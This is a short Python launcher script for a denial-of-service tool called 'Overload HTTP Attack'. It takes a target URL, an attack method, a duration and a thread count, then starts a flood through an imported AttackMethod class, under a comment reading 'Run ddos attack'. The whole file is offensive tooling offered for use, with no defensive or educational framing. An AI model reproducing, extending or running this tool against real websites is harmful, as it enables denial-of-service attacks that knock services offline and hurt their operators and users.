# Created by Cloud
# Import modules
import os
import sys
import argparse

# Go to current dir
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.method import AttackMethod
except ImportError as err:
    CriticalError("Failed import some modules", err)
    sys.exit(1)

# Parse args
parser = argparse.ArgumentParser(description="Overload HTTP Attack")
parser.add_argument(
    "--target",
    type=str,
    metavar="<URL>",
    help="Target URL",
)
parser.add_argument(
    "--method",
    type=str,
    metavar="<HTTP>",
    help="Attack method",
)
parser.add_argument(
    "--time", type=int, default=1200, metavar="<time>", help="time in secounds"
)
parser.add_argument(
    "--threads", type=int, default=100, metavar="<threads>", help="threads count (1-200)"
)

# Get args
args = parser.parse_args()
threads = args.threads
time = args.time
method = str(args.method).upper()
target = args.target


if __name__ == "__main__":
    # Print help
    if not method or not target or not time:
        parser.print_help()
        sys.exit(1)

    # Run ddos attack
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()
